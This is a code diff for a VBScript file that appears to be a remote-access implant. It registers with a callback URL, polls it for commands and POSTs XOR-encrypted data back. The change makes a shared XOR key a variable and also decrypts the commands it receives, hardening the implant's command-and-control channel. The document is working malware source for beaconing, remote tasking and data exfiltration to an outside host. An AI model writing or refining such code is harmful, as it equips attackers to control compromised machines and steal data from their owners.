@@ -15,7 +15,9 @@ If downloadSucceeded Then
 End If
 
 
-Dim xmlHttpReq, s, coutput, abc, break, re, friendly_name, encrData, exfdata, folderPath,dteWait
+Dim xmlHttpReq, s, coutput, abc, break, re, friendly_name, encrData, exfdata, folderPath,dteWait, key
+
+key = ".*!"
 
 Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
 xmlHttpReq.Open "GET", callbackUrl & "/REGISTER_VBS", false
@@ -32,6 +34,7 @@ While break <> True
     xmlHttpReq.Send
 
     coutput = Trim(xmlHttpReq.responseText)
+    coutput = GetEncData(coutput, key)
 
 
     If coutput = "NOP"  Then
@@ -84,7 +87,7 @@ End Function
 
 Function Post(data)
     Dim utf8ByteArray,utf8String
-    encrData = GetEncData(data, ".*!") ' Encrypt the data using your XOR function
+    encrData = GetEncData(data, key) ' Encrypt the data using your XOR function
      ' Convert the encrypted data to a UTF-8 byte array
     Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
     xmlHttpReq.Open "POST", callbackUrl, False
